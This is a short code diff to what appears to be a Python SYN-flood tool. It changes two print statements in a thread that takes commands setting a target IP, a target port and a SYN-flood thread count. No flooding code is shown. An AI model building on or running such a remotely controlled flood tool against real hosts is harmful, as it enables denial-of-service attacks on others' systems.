@@ -104,10 +104,10 @@ class monitor_thread(threading.Thread):
             data = str(data, encoding='utf-8').strip()
             if data[:2] == 'IP':
                 tgt_ip = data[2:].strip()
-                print ("Set target IP to "+tgt_ip)
+                print ("Set target IP to "+str(tgt_ip))
             if data[:4] == 'PORT':
                 tgt_port = int(data[4:].strip())
-                print ("Set target port to "+tgt_port)
+                print ("Set target port to "+str(tgt_port))
             if data[:3] == 'SYN':
                 n_synflood = int(data[3:].strip())
                 print ("Set synflood thread number to "+str(n_synflood))
